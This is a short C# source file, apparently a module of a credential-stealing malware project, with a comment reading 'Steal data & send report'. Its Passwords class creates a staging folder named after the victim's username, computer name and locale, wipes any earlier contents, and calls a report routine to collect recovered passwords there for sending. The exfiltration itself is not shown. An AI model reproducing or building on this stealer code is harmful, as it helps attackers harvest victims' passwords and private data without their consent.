using deepside;
using System;
using System.IO;

namespace spasibozapas
{
    internal sealed class Passwords
    {
        // spasibozapas modules
        private static string PasswordsStoreDirectory = Path.Combine(
            Paths.InitWorkDir(),
            SystemInfo.username + "@" + SystemInfo.compname + "_" + SystemInfo.culture);

        // Steal data & send report
        public static string Save()
        {
           // Console.WriteLine(" passwords recovery...");
            if (!Directory.Exists(PasswordsStoreDirectory)) Directory.CreateDirectory(PasswordsStoreDirectory);
            else try { Filemanager.RecursiveDelete(PasswordsStoreDirectory); } catch { /*Logging.Log("Failed recursive remove directory with passwords"); */ };
            //Console.WriteLine("PasswordsStoreDirectoryL: " + PasswordsStoreDirectory);

            if (Report.CreateReport(PasswordsStoreDirectory))
                return PasswordsStoreDirectory;
            return "";
        }

    }
}
